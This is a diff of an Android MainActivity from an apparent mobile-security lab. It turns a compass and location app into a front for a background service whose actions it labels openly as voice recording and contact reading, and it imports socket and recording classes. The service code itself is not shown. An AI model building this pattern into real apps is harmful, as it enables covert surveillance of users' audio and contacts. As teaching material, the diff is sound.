@@ -1,12 +1,11 @@
 package com.example.lab5;
 
 import android.Manifest;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
-import android.app.PendingIntent;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.hardware.Sensor;
 import android.hardware.SensorEvent;
 import android.hardware.SensorEventListener;
@@ -14,9 +13,11 @@ import android.hardware.SensorManager;
 import android.location.Address;
 import android.location.Geocoder;
 import android.location.Location;
-import android.location.LocationRequest;
-import android.os.Build;
+import android.media.MediaRecorder;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.ResultReceiver;
+import android.provider.ContactsContract;
 import android.util.Log;
 import android.view.animation.Animation;
 import android.view.animation.LinearInterpolator;
@@ -25,6 +26,7 @@ import android.widget.ImageView;
 import android.widget.TextView;
 
 import androidx.activity.EdgeToEdge;
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.graphics.Insets;
@@ -37,10 +39,16 @@ import com.google.android.gms.tasks.CancellationToken;
 import com.google.android.gms.tasks.CancellationTokenSource;
 import com.google.android.gms.tasks.OnSuccessListener;
 
+import java.io.DataOutputStream;
 import java.io.IOException;
+import java.net.Socket;
 import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
+    public static final String START_VOICE_RECORDING = "START_VOICE_RECORDING";
+    public static final String STOP_VOICE_RECORDING = "STOP_VOICE_RECORDING";
+    public static final String START_READING_CONTACTS = "START_READING_CONTACTS";
+    public static final String STOP_READING_CONTACTS = "STOP_READING_CONTACTS";
     float[] accelerometerValues;
     float[] magneticFieldValues;
     float oldAzimuth = 0f;
@@ -54,9 +62,17 @@ public class MainActivity extends AppCompatActivity {
         EdgeToEdge.enable(this);
         setContentView(R.layout.activity_main);
 
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED &&
+                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_NETWORK_STATE) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this,
+                    new String[]{Manifest.permission.INTERNET, Manifest.permission.ACCESS_NETWORK_STATE},
+                    100);
+            return;
+        }
+
         getSensorData();
         getCurrentLocation();
-        createNotificationChannel();
+        createResultReceiver();
 
         ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
             Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
@@ -64,6 +80,39 @@ public class MainActivity extends AppCompatActivity {
             return insets;
         });
     }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == 100) {
+            boolean fineLocationGranted = false;
+            boolean coarseLocationGranted = false;
+
+            for (int i = 0; i < permissions.length; i++) {
+                String permission = permissions[i];
+                int grantResult = grantResults[i];
+
+                if (permission.equals(Manifest.permission.ACCESS_FINE_LOCATION) && grantResult == PackageManager.PERMISSION_GRANTED) {
+                    fineLocationGranted = true;
+                    Log.d("LocationPermissions", "ACCESS_FINE_LOCATION permission granted.");
+                }
+                if (permission.equals(Manifest.permission.ACCESS_COARSE_LOCATION) && grantResult == PackageManager.PERMISSION_GRANTED) {
+                    coarseLocationGranted = true;
+                    Log.d("LocationPermissions", "ACCESS_COARSE_LOCATION permission granted.");
+                }
+            }
+
+            if (fineLocationGranted || coarseLocationGranted) {
+                Log.d("LocationPermissions", "Location permissions have been granted. Getting location now.");
+                getCurrentLocation();
+            } else {
+                Log.d("LocationPermissions", "Location permissions were denied by the user.");
+                TextView currentLocationTextView = findViewById(R.id.currentLocation);
+                currentLocationTextView.setText("Location permission is required to show the current address.");
+            }
+        }
+    }
+
 
     private void getSensorData() {
         SensorManager sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
@@ -104,6 +153,7 @@ public class MainActivity extends AppCompatActivity {
                 SensorManager.SENSOR_DELAY_NORMAL
         );
     }
+
     private void rotateCompassImage() {
         if (accelerometerValues == null || magneticFieldValues == null) {
             return;
@@ -123,7 +173,7 @@ public class MainActivity extends AppCompatActivity {
                 orientation
         );
 
-        float newAzimuth = (float)Math.toDegrees(orientation[0]);
+        float newAzimuth = (float) Math.toDegrees(orientation[0]);
 
         RotateAnimation rotateAnimation = new RotateAnimation(
                 oldAzimuth,
@@ -147,7 +197,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void getCurrentLocation() {
         FusedLocationProviderClient fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
-        int priority = LocationRequest.QUALITY_BALANCED_POWER_ACCURACY;
+        int priority = com.google.android.gms.location.LocationRequest.PRIORITY_HIGH_ACCURACY;
         CancellationToken cancellationToken = new CancellationTokenSource().getToken();
 
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
@@ -159,21 +209,16 @@ public class MainActivity extends AppCompatActivity {
         }
 
         fusedLocationClient.getCurrentLocation(priority, cancellationToken)
-                .addOnSuccessListener(location -> {
-                    if (location != null) {
+                .addOnSuccessListener(this, new OnSuccessListener<Location>() {
+                    @Override
+                    public void onSuccess(Location location) {
+                        if (location == null) {
+                            return;
+                        }
                         latitude = location.getLatitude();
                         longitude = location.getLongitude();
+
                         convertParameters();
-                    } else {
-                        fusedLocationClient.getLastLocation().addOnSuccessListener(lastLocation -> {
-                            if (lastLocation != null) {
-                                latitude = lastLocation.getLatitude();
-                                longitude = lastLocation.getLongitude();
-                                convertParameters();
-                            } else {
-                                Log.d("LATITUDE", "NO LOCATION AVAILABLE");
-                            }
-                        });
                     }
                 });
     }
@@ -213,32 +258,29 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-    private void createNotificationChannel() {
-        CharSequence name = getString(R.string.nc_name);
-        String description = getString(R.string.nc_description);
-        int importance = NotificationManager.IMPORTANCE_HIGH;
+    private void createResultReceiver() {
+        ResultReceiver r = new ResultReceiver(new Handler()) {
+            @Override
+            protected void onReceiveResult(int status, Bundle data) {
+                super.onReceiveResult(status, data);
+                TextView maliciousActivityTextView = findViewById(R.id.maliciousActivityText);
 
-        NotificationChannel notificationChannel = null;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            notificationChannel = new NotificationChannel("my_nc", name, importance);
-        }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            notificationChannel.setDescription(description);
-        }
-        NotificationManager notificationManager = getSystemService(NotificationManager.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            notificationManager.createNotificationChannel(notificationChannel);
-        }
+                String type = data.getString("type");
 
-        Intent compassIntent = new Intent(this, MainActivity.class);
-        compassIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
+                if (type == null) return;
 
-        PendingIntent pendingCompassIntent =
-                PendingIntent.getActivity(
-                        this,
-                        0,
-                        compassIntent,
-                        PendingIntent.FLAG_IMMUTABLE
-                );
+                if (type.equals(START_VOICE_RECORDING)) {
+                    maliciousActivityTextView.setText("Recording audio");
+                } else if (type.equals(START_READING_CONTACTS)) {
+                    maliciousActivityTextView.setText("Reading contacts");
+                } else if (type.equals(STOP_VOICE_RECORDING) || type.equals(STOP_READING_CONTACTS)) {
+                    maliciousActivityTextView.setText("Idle");
+                }
+            }
+        };
+
+        Intent intent = new Intent(this, MyService.class);
+        intent.putExtra("resultReceiver", r);
+        this.startService(intent);
     }
 }
